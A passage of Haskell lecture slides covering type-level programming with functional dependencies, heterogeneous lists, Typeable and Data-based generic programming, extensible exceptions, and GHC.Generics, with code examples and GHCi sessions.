   instance (NatPlus a b c) => NatPlus (Succ a) b (Succ c) where 
       natPlus (Succ a) b = (Succ (natPlus a b))
       natMinus (Succ c) (Succ a) = natMinus c a
   ~~~~

   * Fundeps + Context let us compute recursively on types!
       * If context has assertion `NatPlus a b c`, then from types
       `Succ a` and `b` we can compute `Succ c` (computation at type level)


   # Type-level booleans

   ~~~~ {.haskell}
   data HFalse = HFalse deriving Show
   data HTrue = HTrue deriving Show

   class HNot a b | a -> b where hnot :: a -> b
   instance HNot HFalse HTrue where hnot _ = HTrue
   instance HNot HTrue HFalse where hnot _ = HFalse

   class HEven a b | a -> b where hEven :: a -> b
   instance HEven Zero HTrue where hEven _ = HTrue
   instance (HEven n b, HNot b nb) => HEven (Succ n) nb where
       hEven (Succ n) = hnot (hEven n)
   ~~~~

   ~~~~
   *Main> hEven Zero
   HTrue
   *Main> hEven (Succ Zero)
   HFalse
   *Main> hEven (Succ (Succ Zero))
   HTrue
   *Main> hEven (Succ (Succ (Succ Zero)))
   HFalse
   ~~~~

   * Note how we use assertion `HNot b nb` to compute negation of `b`

   -->

Warm-up: Type-level booleans
============================

.. code:: haskell

   data HFalse = HFalse deriving Show
   data HTrue = HTrue deriving Show

   class HNot a b | a -> b where hNot :: a -> b
   instance HNot HFalse HTrue where hNot _ = HTrue
   instance HNot HTrue HFalse where hNot _ = HFalse

::

   *Main> hNot HTrue
   HFalse
   *Main> hNot HFalse
   HTrue

-  Note how fundep in ``HNot b nb`` computes negation of ``b`` **at the
   type level**
-  Haven’t used ``OverlappingInstances`` yet, let’s start…

Computing over types
====================

-  Can we compute whether two types are equal? First attempt:

   .. code:: haskell

      class TypeEq a b c | a b -> c where typeEq :: a -> b -> c
      instance TypeEq a a HTrue where typeEq _ _ = HTrue
      instance TypeEq a b HFalse where typeEq _ _ = HFalse

   -  Problem: ``TypeEq a a HTrue`` not more specific than
      ``TypeEq a b HFalse``
   -  … but ``TypeEq a a HTrue`` *is* more specific than
      ``TypeEq a b c``

-  Recall that context is never consulted for instance selection

   -  Only afterwards to reject failed assertions or infer types from
      fundeps
   -  Solution: compute ``c`` after instance selection using another
      fundep

   .. code:: haskell

      class TypeCast a b | a -> b where typeCast :: a -> b
      instance TypeCast a a where typeCast = id

      instance TypeEq a a HTrue where typeEq _ _ = HTrue -- as before
      instance (TypeCast HFalse c) => TypeEq a b c where
          typeEq _ _ = typeCast HFalse

The utility of ``TypeEq``
=========================

-  Editorial: ``TypeEq`` is kind of the holy grail of fundeps

   -  If you can implement ``TypeEq``, you can program recursively at
      type level by distinguishing base and recursive cases!
   -  But relies deeply on ``OverlappingInstances`` …

-  Example: Let’s do for ``MonadState`` what we did for ``MonadIO``

   .. code:: haskell

      -- If t is StateT, then do one thing for (t s m) (base case):
      instance (Monad m) => MonadState s (StateT s m) where
          get = StateT $ \s -> return (s, s)
          put = StateT $ \_ -> return ((), s)
      -- If t is not StateT, do something else (recursive case):
      instance (MonadTrans t, MonadState s m, Monad (t m)) =>
          MonadState s (t m) where
              get = lift get
              put = lift . put

   -  ``MonadIO`` was easier because type ``IO`` can’t match parameter
      ``(t m)``
   -  Unfortunately, ``StateT s m`` matches *both* of above instance
      heads
   -  So need ``OverlappingInstances`` to select first instance for
      ``StateT s m``

Heterogeneous lists
===================

-  Last extension:
   ```TypeOperators`` <http://www.haskell.org/ghc/docs/latest/html/users_guide/data-type-extensions.html#infix-tycons>`__
   allows infix types starting with “``:``”

   .. code:: haskell

      data a :*: b = Foo a b
      type a :+: b = Either a b

-  Let’s use an infix constructor to define a heterogeneous list

   .. code:: haskell

      data HNil = HNil deriving Show
      data (:*:) h t = h :*: !t deriving Show
      infixr 9 :*:

      -- Example:
      data A = A deriving Show
      data B = B deriving Show
      data C = C deriving Show

      foo = (A, "Hello") :*: (B, 7) :*: (C, 3.0) :*: HNil

   ::

      *Main> foo
      (A,"Hello") :*: ((B,7) :*: ((C,3.0) :*: HNil))
      *Main> :t foo
      foo :: (A, [Char]) :*: ((B, Integer) :*: ((C, Double) :*: HNil))

Operations on heterogeneous lists
=================================

-  Notice our list consisted of pairs

   .. code:: haskell

      foo :: (A, [Char]) :*: (B, Integer) :*: (C, Double) :*: HNil
      foo = (A, "Hello") :*: (B, 7) :*: (C, 3.0) :*: HNil

   -  View first element as a key or tag, second as a value–How to look
      up value?

   .. code:: haskell

      class Select k h v | k h -> v where
          (.!) :: h -> k -> v
      instance Select k ((k, v) :*: t) v where
          (.!) ((_, v) :*: _) _ = v
      instance (Select k h v) => Select k (kv' :*: h) v where
          (.!) (kv' :*: h) k = h .! k

   ::

      *Main> foo .! A
      "Hello"

-  Once again, note the importance of ``OverlappingInstances``

   -  Needed to break recursion when type of lookup tag matches head of
      list

-  Can use to implement all sorts of other features (concatenation,
   etc.)

Object-oriented programming
===========================

-  Heterogeneous can implement object-oriented programming!

   .. code:: haskell

      returnIO :: a -> IO a
      returnIO = return

      data GetVal = GetVal deriving Show
      data SetVal = SetVal deriving Show
      data ClearVal = ClearVal deriving Show

      mkVal n self = do
        val <- newIORef (n :: Int)
        returnIO $ (GetVal, readIORef val)
                 :*: (SetVal, writeIORef val)
                 :*: (ClearVal, self .! SetVal $ 0)
                 :*: HNil

      test = do               -- prints 7, then 0
        x <- mfix $ mkVal 7
        x .! GetVal >>= print
        x .! ClearVal
        x .! GetVal >>= print

-  But why ``mfix``?

“Tying the recursive knot”
==========================

-  ``mfix`` allows you to override methods with inheritance

   -  Example, create a “const val” that ignores ``SetVal`` messages

   .. code:: haskell

      mkConstVal n self = do
        super <- mkVal n self
        returnIO $ (SetVal, const $ return ())
                 :*: super

      test2 = do
        x <- mfix $ mkConstVal 7
        x .! GetVal >>= print
        x .! ClearVal
        x .! GetVal >>= print

   ::

      *Main> test
      7
      0
      *Main> test2
      7
      7   

-  ``mkVal`` ’s call to ``SetVal`` was properly overridden by
   ``mkConstVal``


/L8 Generic programming
=========================

Coverting tuples to lists
=========================

-  Let’s say you wanted to convert pairs to lists of ``Strings``

   .. code:: haskell

      pairToStringList :: (Show a, Show b) => (a, b) -> [String]
      pairToStringList (a, b) = [show a, show b]

   ::

      *Main> pairToStringList (True, Just 3)
      ["True","Just 3"]

-  Now say you want to convert a pair of ``Enum`` s to a list of
   ``Int`` s

   .. code:: haskell

      pairToIntList :: (Enum a, Enum b) => (a, b) -> [Int]
      pairToIntList (a, b) = [fromEnum a, fromEnum b]

-  Can we generalize this function? Would like to say:

   .. code:: haskell

      pairToList conv (a, b) = [conv a, conv b]
      pairToList show (True, Just 3)   -- error

   -  Unfortunately, can’t pass *methods* as arguments, only *functions*

      .. code:: haskell

         pairToList :: (a -> b) -> (a, a) -> [b]

Polymorphism with fundeps
=========================

-  Let’s represent ad hoc polymorphic methods with a *class*

   .. code:: haskell

      {-# LANGUAGE MultiParamTypeClasses #-}
      {-# LANGUAGE FunctionalDependencies #-}
      {-# LANGUAGE FlexibleInstances #-}

      class Function f a b | f a -> b where
          funcall :: f -> a -> b
      instance Function (a -> b) a b where
          funcall = id

      pairToList :: (Function f a c, Function f b c) =>
                    f -> (a, b) -> [c]
      pairToList f (a, b) = [funcall f a, funcall f b]

-  Use placeholder singleton types to represent particular methods

   .. code:: haskell

      data ShowF = ShowF
      instance (Show a) => Function ShowF a [Char] where
          funcall _ = show

      data FromEnumF = FromEnumF
      instance (Enum a) => Function FromEnumF a Int where
          funcall _ = fromEnum

``Function`` in action
======================

-  Now singleton types act like method arguments:

   .. code:: haskell

      *Main> pairToList ShowF (True, 3)
      ["True","3"]
      *Main> pairToList FromEnumF (False, 7)
      [0,7]

-  Now, what if you wanted ``tupleToList`` for arbitrary
   :math:`n`-tuples?

   -  Can auto-generate instances for a generic tuple fold, e.g.:

   .. code:: haskell

      class TupleFoldr f z t r | f z t -> r where
          tupleFoldr :: f -> z -> t -> r

   -  Works okay for small tuples, craps out around 10-tuple without
      larger ``-fcontext-stack`` argument

-  Unfortunately, I’m temporarily out of compile-time tricks

   -  An alternative is to use run-time type information (RTTI)
   -  RTTI easier to reason about, but adds runtime overhead and errors
   -  We will come back to static tricks at end of lecture

DeriveDataTypeable extension
============================

-  Haskell allows six classes to be automatically derived

   -  ``Show``, ``Read``, ``Eq``, ``Ord``, ``Bounded``, ``Enum``

-  ```DeriveDataTypeable`` <http://www.haskell.org/ghc/docs/latest/html/users_guide/deriving.html#deriving-typeable>`__
   extension adds two more: ``Typeable``, ``Data``

   .. code:: haskell

      data MyType = Con1 Int | Con2 String deriving (Typeable, Data)

   -  These types encode run-time type information in various ways
   -  ``Data`` requires that inner types (``Int``, ``String``) also have
      instances
   -  ``Typeable`` requires any type parameters to have instances

   .. code:: haskell

      -- MyTyCon only typeable when a is
      data MyTyCon a = MyTyCon a deriving (Typeable, Data)

   -  Most standard library types have ``Typeable`` and ``Data``
      instances

-  Provide programming approach known as “scrap your boilerplate”

   -  GHC’s support described by two papers:
      `[Boilerplate1] <http://research.microsoft.com/en-us/um/people/simonpj/papers/hmap/hmap.ps>`__,
      `[Boilerplate2] <http://research.microsoft.com/en-us/um/people/simonpj/papers/hmap/gmap2.ps>`__

The ```Typeable`` class
=======================

http://hackage.haskell.org/packages/archive/base/latest/doc/html/Data-Typeable.html#t:Typeable

-  ``import Data.Typeable`` to get ``Typeable`` class:

   .. code:: haskell

      class Typeable a where
          typeOf :: a -> TypeRep -- Note: never evaluates argument

      data TypeRep -- Opaque, but instance of Eq, Ord, Show, Typeable

-  This allows us to compare types for equality

   .. code:: haskell

      rtTypeEq :: (Typeable a, Typeable b) => a -> b -> Bool
      rtTypeEq a b = typeOf a == typeOf b

   ::

      *Main> rtTypeEq True False
      True
      *Main> rtTypeEq True 5
      False

-  Big Whoop!

   -  Couldn’t we already do this at compile time with
      ``OverlappingInstances``?
   -  Doing it dynamically is less exciting, but different
   -  And allows one very important function…

Type Casting
============

-  GHC has a function
   ```unsafeCoerce`` <http://hackage.haskell.org/packages/archive/base/latest/doc/html/Unsafe-Coerce.html#v:unsafeCoerce>`__

   .. code:: haskell

      unsafeCoerce :: a -> b

   -  And note: it doesn’t just return :math:`\bot`
   -  If the name doesn’t scare you, the type signature should

-  Let’s use ``Typeable`` to make a safe ``cast`` function

   .. code:: haskell

      cast :: (Typeable a, Typeable b) => a -> Maybe b
      cast a = fix $  ~(Just b) -> if typeOf a == typeOf b
                                    then Just $ unsafeCoerce a
                                    else Nothing

   ::

      *Main> cast "hello" :: Maybe String
      Just "hello"
      *Main> cast "hello" :: Maybe Int
      Nothing

   -  Safe if ``typeOf`` on two different types always returns different
      ``TypeRep`` s
   -  Guaranteed by ``deriving (Typeable)``; SafeHaskell disallows
      manual instances

Generalized casting
===================

-  To cast monadic computations, etc., use generalized cast, ``gcast``:

   .. code:: haskell

      import Data.Maybe (fromJust)

      gcast :: (Typeable a, Typeable b) => c a -> Maybe (c b)
      gcast ca = mcr
        where mcr = if typeOf (unc ca) == typeOf (unc $ fromJust mcr)
                    then Just $ unsafeCoerce ca
                    else Nothing
              unc :: c x -> x
              unc = undefined

   ::

      *Main> fromJust $ gcast (readFile "/etc/issue") :: IO String
      "\nArch Linux \\r  (\\n) (\\l)\n\n"
      *Main> fromJust $ gcast (readFile "/etc/issue") :: IO Int
      *** Exception: Maybe.fromJust: Nothing

-  Note undefined function ``unc`` in definition of ``gcast``

   -  Common idiom–poses no problem because ``typeOf`` is not strict
   -  Recall context ``Typeable b =>`` is like a hidden argument; often
      use undefined functions with type signatures to unpack types and
      get dictionaries

Using ``Typeable``: ``mkT`` ``[Boilerplate1]``
==============================================

http://research.microsoft.com/en-us/um/people/simonpj/papers/hmap/hmap.ps

-  ``mkT`` (“make transformation”) behaves like ``id`` except on one
   type

   .. code:: haskell

      mkT :: (Typeable a, Typeable b) => (b -> b) -> a -> a

-  Example:

   .. code:: haskell

      newtype Salary = Salary Double deriving (Show, Data, Typeable)

      raiseSalary :: (Typeable a) => a -> a
      raiseSalary = mkT $ \(Salary s) -> Salary (s * 1.04)

   ::

      *Main> raiseSalary ()
      ()
      *Main> raiseSalary 7
      7
      *Main> raiseSalary (Salary 7)
      Salary 7.28

-  Exercise: implement ``mkT``

   -  Hint: The function type ``(->)`` is ``Typeable``, so
      ``Data.Typeable`` exports:

   .. code:: haskell

      instance (Typeable a, Typeable b) => Typeable (a -> b) where ...

Solution
========

.. code:: haskell

   mkT :: (Typeable a, Typeable b) => (b -> b) -> a -> a
   mkT f a = case cast f of Just g  -> g a
                            Nothing -> a

-  Note the magic of Haskell’s type inference

   -  ``g`` is applied to ``a``, so must have type ``a -> a``
   -  Hence ``cast f`` must have type ``Maybe (a -> a)``
   -  Hence compiler knows to use ``Typeable`` dictionary of
      ``(b -> b)`` for argument, and dictionary ``(a -> a)`` for return
      of ``cast``

-  `[Jones] <http://web.cecs.pdx.edu/~mpj/thih/>`__ has detailed
   explanation of Haskell’s type inference

-  Note, a fancier implementation could use standard ``maybe`` function

   .. code:: haskell

      maybe :: b -> (a -> b) -> Maybe a -> b
      maybe b _ Nothing  = b
      maybe _ f (Just a) = f a

   .. code:: haskell

      mkT :: (Typeable a, Typeable b) => (b -> b) -> (a -> a)
      mkT f = maybe id id $ cast f

Using ``Typeable``: ``mkQ`` ``[Boilerplate1]``
==============================================

http://research.microsoft.com/en-us/um/people/simonpj/papers/hmap/hmap.ps

-  Function that computes over one type or returns default val:

   .. code:: haskell

      mkQ :: (Typeable a, Typeable b) => r -> (b -> r) -> a -> r
      mkQ defaultVal fn a = ...

   -  ``mkQ`` stands for “make query”

-  Example

   .. code:: haskell

      salaryVal :: Typeable a => a -> Double
      salaryVal = mkQ 0 $ \(Salary s) -> s

   ::

      *Main> salaryVal ()
      0.0
      *Main> salaryVal 7
      0.0
      *Main> salaryVal (Salary 7)
      7.0

-  Exercise: implement ``mkQ``

.. _solution-1:

Solution
========

.. code:: haskell

   mkQ :: (Typeable a, Typeable b) => r -> (b -> r) -> a -> r
   mkQ defaultVal fn a = case cast a of
                           Just b -> fn b
                           Nothing -> defaultVal

-  Or if you want to get fancy:

.. code:: haskell

   mkQ :: (Typeable a, Typeable b) => r -> (b -> r) -> a -> r
   mkQ defaultVal fn = maybe defaultVal fn . cast

Functions on multiple types: ``extQ``
=====================================

-  ``mkQ`` only works for one type

   -  Let’s extend ``mkQ`` ’s output to work on another type
      `[Boilerplate1] <http://research.microsoft.com/en-us/um/people/simonpj/papers/hmap/hmap.ps>`__

   .. code:: haskell

      extQ :: (Typeable a, Typeable b) =>
              (a -> r) -> (b -> r) -> a -> r
      extQ q f a = case cast a of
                     Just b -> f b
                     Nothing -> q a

-  Now can cascade multiple one-type query functions

   .. code:: haskell

      myShow :: Typeable a => a -> String
      myShow = mkQ "unknown type" (show :: Int -> String)
               `extQ` (show :: Bool -> String)
               `extQ` (show :: Integer -> String)
               `extQ` (const "no floating point" :: Double -> String)

   -  Recall default associatifity is left
      (:literal:`infixl 9 \`extQ\``)
   -  Kind of tedious, but could approximate goal of ``tupleToList`` at
      beginning of lecture if tuples contain limited number of types

```ExistentialQuantification`` extension
========================================

http://www.haskell.org/ghc/docs/latest/html/users_guide/data-type-extensions.html#existential-quantification

-  Lets you introduce type variables on right side of ``data``
   declaration

   .. code:: haskell

      {-# LANGUAGE ExistentialQuantification #-}
      data Step s a = Done | Skip !s | Yield !a !s
      data Stream a = forall s. Stream (s -> Step s a) !s                

   -  Given a value of type ``Stream a``, there exists a type ``s`` such
      that… But syntax uses ``forall``, not ``exists``, to avoid
      introducing new keyword
   -  Very safe extension (``Control.Exception`` relies on it)

-  Don’t confuse with
   ```Rank2Types`` <http://www.haskell.org/ghc/docs/latest/html/users_guide/other-type-extensions.html#universal-quantification>`__,
   where ``forall`` means for all types ``s``:

   .. code:: haskell

      data Stream a = Stream (forall s. s -> Step s a)

-  Contexts on existential variables like hidden dictionary fields

   .. code:: haskell

      data Showable = forall a. (Show a) => Showable a
      instance Show Showable where
          show (Showable a) = "Showable " ++ show a

   -  A ``Showable`` value has both a value of type ``a``, and a
      dictionary for ``Show``

Example: Dynamic type
=====================

-  ```Data.Dynamic`` <http://hackage.haskell.org/packages/archive/base/latest/doc/html/Data-Dynamic.html>`__
   has type ``Dynamic``, which can hold anything ``Typeable``

   .. code:: haskell

      data Dynamic  -- opaque type
      toDyn :: Typeable a => a -> Dynamic
      fromDynamic :: Typeable a => Dynamic -> Maybe a

-  Actual implementation slightly gross

   -  Uses ``unsafeCoerce`` to coerce everything to a placeholder
      ``Obj`` type

-  But easy to implement safely with ``ExistentialQuantification``:

   .. code:: haskell

      data Dynamic = forall a. Typeable a => Dynamic a

      toDyn :: Typeable a => a -> Dynamic
      toDyn = Dynamic

      fromDynamic :: Typeable a => Dynamic -> Maybe a
      fromDynamic (Dynamic a) = cast a

Example: Extensible exceptions `[Marlow]`
=========================================

http://community.haskell.org/~simonmar/papers/ext-exceptions.pdf

-  GHC runtime implements primitive, unsafe exceptions

   .. code:: haskell

      raise# :: a -> b
      catch# :: IO a -> (b -> IO a) -> IO a  -- slight simplification

   -  Must ensure that, as used, ``b`` is always same type, otherwise
      get unsafe coercion

-  In reality, want many exception types, organized into a hierarchy

-  ```Control.Exception`` <http://hackage.haskell.org/packages/archive/base/latest/doc/html/Control-Exception.html>`__
   implements safe, hierarchical exceptions

   -  ``raise#`` and ``catch#`` only ever called with one type:
      ``SomeException``

   .. code:: haskell

      class (Typeable e, Show e) => Exception e where
          toException :: e -> SomeException
          toException = SomeException                 -- default impl
          fromException :: SomeException -> Maybe e
          fromException (SomeException e) = cast e    -- default impl

      data SomeException = forall e. Exception e => SomeException e
          deriving Typeable  -- note use of ExistentialQuantification
      instance Show SomeException where
          show (SomeException e) = show e

Throwing and catching exceptions
================================

.. code:: haskell

   class (Typeable e, Show e) => Exception e where
       toException :: e -> SomeException
       fromException :: SomeException -> Maybe e

-  To throw an exception, first convert it to type ``SomeException``

   .. code:: haskell

      throw :: Exception e => e -> a
      throw e = raise# (toException e)

-  To catch an exception, must ensure it matches desired type

   .. code:: haskell

      -- Define catchX because catch#'s real type more complicated
      catchX :: IO a -> (b -> IO a) -> IO a
      catchX (IO a) handler = IO $ catch# a (unIO . handler)

      catch :: (Exception e) => IO a -> (e -> IO a) -> IO a
      catch action handler = catchX action handler'
          where handler' se =
                  maybe (throwIO se) handler $ fromException se

   -  Note ``handler`` makes ``fromException se`` use ``e`` ’s
      ``Exception`` dictionary

Making hierarchical exceptions
==============================

-  Easy to add your own top-level exception type

   .. code:: haskell

      data MyException = MyException deriving (Show, Typeable)
      instance Exception MyException -- use default methods

-  But you can also create a hierarchy of exception types

   .. code:: haskell

      data AppError = forall e. Exception e => AppError e
                      deriving (Typeable)
      instance Show AppError where show (AppError e) = show e
      instance Exception AppError

      data Error1 = Error1 deriving (Show, Typeable)
      instance Exception Error1 where
          toException = toException . AppError
          fromException se = do  -- using Maybe as a Monad here
            AppError e <- fromException se
            cast e

      -- Now can do the same for Error2, and catch both as AppError

   -  Let’s you catch just ``Error1``, or any ``AppError``

The ```Data`` class
===================

http://hackage.haskell.org/packages/archive/base/latest/doc/html/Data-Data.html#t:Data

.. code:: haskell

   class Typeable a => Data a where ...

-  ``Data`` class allows generic traversal and construction of data
   structures

   -  Defines ``gfoldl`` and ``gunfold`` methods like this

   .. code:: haskell

      data T a b = C1 a b | C2 deriving (Typeable, Data)

      gfoldl k z (C1 a b) = z C1 `k` a `k` b
      gfoldl k z C2       = z C2

      toConstr (C1 _ _) = ...     -- encodes constructor number
      toConstr C2       = ...
      gunfold k z c = case constrIndex c of
                          1 -> k (k (z C1))
                          2 -> z C2

-  Now can work over all sized tuples! But:

   -  Once you introduce types, things get uglier [cosmetic]
   -  The only dictionaries available are ``Data`` and ``Typeable``
      [fundamental]
   -  All the runtime type checking is slow [fundamental]

.. raw:: html

   <!--

   # The [`Data`] class

   ~~~~ {.haskell}
   class Typeable a => Data a where ...
   ~~~~

   * In addition to `Typeable`, can also derive `Data`
       * Allows generic traversal and construction of data structures
       * We will build it up one method at a time, using the following example

       ~~~~ {.haskell}
       import Data.Data

       data T a b = C1 a b | C2 deriving (Typeable, Data)
       ~~~~

   * `deriving Data` will cause this `gfoldl` method to be defined

       ~~~~ {.haskell}
       gfoldl k z (C1 a b) = z C1 `k` a `k` b
       gfoldl k z C2       = z C2
       ~~~~

       * This allows us to implement functions working over all sized tuples
   * Two limitations:
       1. Once you introduce types, things get uglier [cosmetic]
       2. The only dictionaries available are `Data` and `Typeable` [fundamental]

   # `gfoldl` traversals

   * The actual type of `gfoldl`:

       ~~~~ {.haskell}
       -- Recall:  gfoldl k z (C1 a b) = ((z C1) `k` a) `k` b

       gfoldl  :: (forall d b. Data d => c (d -> b) -> d -> c b)  -- k
               -> (forall g. g -> c g)                            -- z
               -> a
               -> c a
       ~~~~

   * If you ignore the `c` parameter, looks like re-applying constructor
       * E.g., call `gfoldl ($) id x`, where `b` type of partially
          applied constructor
       * Can wrap `Identity` monad (applicative functor) around values to
         ignore `c`

       ~~~~ {.haskell}
       raiseSalaries :: (Data x) => x -> x
       raiseSalaries x = runIdentity $ gfoldl step return (raiseSalary x)
           where step cdb d = cdb <*> (pure $ raiseSalaries d)
       ~~~~

       * Function only bumps salaries, leaves other data fields alone

       ~~~~
       *Main> raiseSalaries $ Just (1, Salary 4, True, (Salary 7, ()))
       Just (1,Salary 4.16,True,(Salary 7.28,()))
       ~~~~

   # `gfoldl` queries

   * Can use a different type `c` to ignore constructor/arg types

       ~~~~ {.haskell}
       newtype Q r a = Q { unQ :: r }

       qappend :: (Monoid r) => Q r a -> Q r b -> Q r c
       qappend (Q r1) (Q r2) = Q $ mappend r1 r2
       ~~~~

       * Notice we completely ignore second type argument (`a`)
   * Now say we want to sum all salaries in a structure

       ~~~~ {.haskell}
       sumSalaries :: (Data x) => x -> Double
       sumSalaries x = getSum $ unQ $ gfoldl step (\_ -> toQ x) x
           where step tot d = tot `qappend` (Q $ Sum $ sumSalaries d)
                 toQ = mkQ (Q $ Sum 0) $ \(Salary s) -> Q $ Sum s
       ~~~~

       ~~~~
       *Main> sumSalaries (Salary 7, Salary 9, True, Just (Salary 4))
       20.0
       ~~~~

   # Unfolding [[Boilerplate2]]

   * We've seen how to traverse, modify, and reduce data structures
       * Could, for instance, use `gfoldl` to serialize a data structure
       * What about unserializing a data structure?
   * `Data` contains two more useful methods

       * Again, assume example type

       ~~~~ {.haskell}
       data T a b = C1 a b | C2 deriving (Typeable, Data)
       ~~~~

       * And `Data` will contain the following methods for `T`:

       ~~~~ {.haskell}
       toConstr (C1 _ _) = ...     -- encodes constructor number
       toConstr C2       = ...

       gunfold k z c = case constrIndex c of
                           1 -> k (k (z C1))
                           2 -> z C2
       ~~~~

       * This is the dual of `gfoldl`--instead of supplying the values to
         `k`, now `k` has a chance to feed values to the constructor

   # Type of `gunfold`

   ~~~~ {.haskell}
   class (Typeable a) => Data a where
       dataTypeOf :: a -> DataType -- non-strict, return has [Constr]
       toConstr :: a -> Constr
       gunfold :: (forall b r. Data b => c (b -> r) -> c r)
               -> (forall r. r -> c r)
               -> Constr
               -> c a

   dataTypeConstrs :: DataType -> [Constr]
   indexConstr :: DataType -> Int -> Constr
   maxConstrIndex :: DataType -> Int
   ~~~~

   * Now you can use `cast` to produce values to feed into constructor
   * Can use to implement generic read/unmarshal functions
       * See examples in [[Boilerplate2]] paper

   -->

Can we do it at compile time?
=============================

-  Alternative: push generic programming to compile time
   `[Magalhães] <http://dreixel.net/research/pdf/gdmh.pdf>`__

-  Let’s look at a simplified implementation

   -  ``wget``
      ```cs240h.stanford.edu/metadata.hs`` <http://www.scs.stanford.edu/14sp-cs240h/metadata.hs>`__

-  High-level idea: Say you auto-derived instances of ``Show``-like
   class:

   .. code:: haskell

      class MyShow a where myShow :: a -> String

      instance MyShow MyType where myShow = genericMyShow

   -  Introduce generic ``MetaData`` class for which compiler can
      generate instance

   .. code:: haskell

      class MetaData d m | d -> m, m -> d where -- not what GHC does
        fromData :: d -> m
        toData :: m -> d

   -  And a ``MyShow``-specific meta-class, such that?

   .. code:: haskell

      class MetaMyShow a where metaMyShow :: a -> String
      genericMyShow :: (MetaData d m, MetaMyShow m) => d -> String
      genericMyShow = metaMyShow . fromData

```DefaultSignatures`` extension
================================

-  We can do even better using
   ```DefaultSignatures`` <http://www.haskell.org/ghc/docs/latest/html/users_guide/type-class-extensions.html#class-default-signatures>`__
   extension

-  Allows default methods that don’t work for all instances

.. code:: haskell

   {-# LANGUAGE DefaultSignatures #-}

   class MyShow a where
     myShow :: a -> String
     default myShow :: (MetaData a m, MetaMyShow m) => a -> String
     myShow = genericMyShow

-  Makes it even easier to declare instances

.. code:: haskell

   instance MyShow MyType

-  Let’s see how we could design such a ``MetaData`` class

   -  ``wget``
      ```cs240h.stanford.edu/metadata.hs`` <http://www.scs.stanford.edu/14sp-cs240h/metadata.hs>`__

```DeriveGeneric`` extension
============================

http://www.haskell.org/ghc/docs/latest/html/users_guide/generic-programming.html

-  Compiler supports single ``Generic`` class that converts any datatype
   to a ``Rep`` that can be computed over generically:

   .. code:: haskell

      {-# LANGUAGE TypeFamilies #-}

      class Generic a where
        type Rep a :: * -> *
        from :: a -> Rep a x
        to :: Rep a x -> a

-  ``type Rep`` uses extension called ``TypeFamilies``. Can read above
   as:

   .. code:: haskell

      class Generic a rep | a -> rep where
          from :: a -> rep x
          to :: rep x -> a

-  Like our simpler example, except everything of kind ∗ → ∗

   -  Why? Maybe so you need a Ph.D. to use the extension?
   -  (Allegedly will someday facilitate generic types of kind ∗ → ∗, so
      can make generic ``Functor``-like instances)

``Rep`` of a unit type
======================

.. code:: haskell

   {-# LANGUAGE DeriveGeneric, TypeFamilies, TypeOperators,
       FlexibleInstances, FlexibleContexts, UndecidableInstances #-}

   import GHC.Generics

   data X = X  -- because we are dealing with types of kind * -> *
   undef2 :: mi c f p -> f p
   undef2 _ = undefined

   -- A unit type has one constructor and no arguments
   data T1 = C1 deriving (Show, Generic)

::

   *Main> :t from C1
   from C1 :: Rep T1 x
   *Main> :t (undefined :: Rep T1 X)
   (undefined :: Rep T1 X) :: D1 Main.D1T1 (C1 Main.C1_0T1 U1) X
   *Main> datatypeName (from C1)
   "T1"
   *Main> moduleName (from C1)
   "Main"
   *Main> conName $ undef2 (from C1)
   "C1"

```GHC.Generics`` contents (part 1)
===================================

http://www.haskell.org/ghc/docs/latest/html/libraries/base-4.7.0.0/GHC-Generics.html

.. code:: haskell

   {-# LANGUAGE TypeFamilies, KindSignatures, TypeOperators #-}

   -- | Unit: used for constructors without arguments
   data U1 p = U1

   -- | Meta-information (constructor names, etc.)
   newtype M1 i c f p = M1 { unM1 :: f p }

   -- | Three flavors of meta-information for variable i
   data D; type D1 = M1 D -- c instance of Datatype, f is C1 (or :+:)
   data C; type C1 = M1 C -- c instance of Constructor, f is S1 (or :*:)
   data S; type S1 = M1 S -- c instance of Selector, f is U1 (or Rec0)

   class Datatype d where
     datatypeName :: t d (f :: * -> *) a -> String
     moduleName   :: t d (f :: * -> *) a -> String
   class Constructor c where
     conName :: t c (f :: * -> *) a -> String
   class Selector s where
     selName :: t s (f :: * -> *) a -> String

Types with constructor arguments
================================

.. code:: haskell

   data T2 = C2 { t2a :: Bool } deriving (Show, Generic)
   data T3 = C3 { t3a :: Bool, t3b :: Bool } deriving (Show, Generic)

::

   *Main> :t (undefined :: Rep T2 X)
   (undefined :: Rep T2 X)
     :: D1 Main.D1T2 (C1 Main.C1_0T2 (S1 Main.S1_0_0T2 (Rec0 Bool))) X
   *Main> -- This was U1 for type T1 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   *Main> conName (undef2 $ from $ C2 True)
   "C2"
   *Main> selName (undef2 $ undef2 $ from $ C2 True)
   "t2a"
   *Main> :t (undefined :: Rep T3 X)
   (undefined :: Rep T3 X)
     :: D1
          Main.D1T3
          (C1
             Main.C1_0T3
             (S1 Main.S1_0_0T3 (Rec0 Bool) :*: S1 Main.S1_0_1T3 (Rec0 Bool)))
          X

-  Note selectors are one feature our simpler example didn’t have

   -  Let’s you pick out record names from types

```GHC.Generics`` contents (part 2)
===================================

http://www.haskell.org/ghc/docs/latest/html/libraries/base-4.7.0.0/GHC-Generics.html

.. code:: haskell

   -- Used to glue multiple constructor arguments together
   data (:*:) f g p = f p :*: g p
   infixr 6 :*:

   -- Used to represent a type with multiple constructors
   data (:+:) f g p = L1 { unL1 :: f p } | R1 { unR1 :: g p }
   infixr 5 :+:

   -- Used to hold actual concrete values of constructor arguments
   newtype K1 i c p = K1 { unK1 :: c }
   type Rec0 = K1 R

   -- From two slides ago:
   data U1 p = U1 -- Unit constructors (no arguments)
   newtype M1 i c f p = M1 { unM1 :: f p }
   data D; type D1 = M1 D -- c instance of Datatype, f is C1 or :+:
   data C; type C1 = M1 C -- c instance of Constructor, f is S1 or :*:
   data S; type S1 = M1 S -- c instance of Selector, f is U1 or Rec0

-  Again, ignore parameter ``p`` (there to make types of kind ∗ → ∗)
-  ``M1`` exists so a single traversal method can skip over ``D1``,
   ``C1``, and ``S1``
-  Could say ``newtype Rec0 c p = K1 c``, but some instances use
   ``K1 P``

What would a ``Generic`` instance look like?
============================================

.. code:: haskell

   data T a b = C1 a b | C2 deriving (Show, Generic)

   data T_
   instance Datatype T_ where
       datatypeName _ = "T"
       moduleName _ = "Main"

   data T_C1_
   data T_C2_
   instance Constructor T_C1_ where conName _ = "C1"
   instance Constructor T_C2_ where conName _ = "C2"

   type Rep0T_ a_0 b_1 = D1 T_
     (C1 T_C1_ (S1 NoSelector (Rec0 a_0) :*: S1 NoSelector (Rec0 b_1))
      :+: (C1 T_C2_ U1))

   instance Generic (T a_0 b_1) where
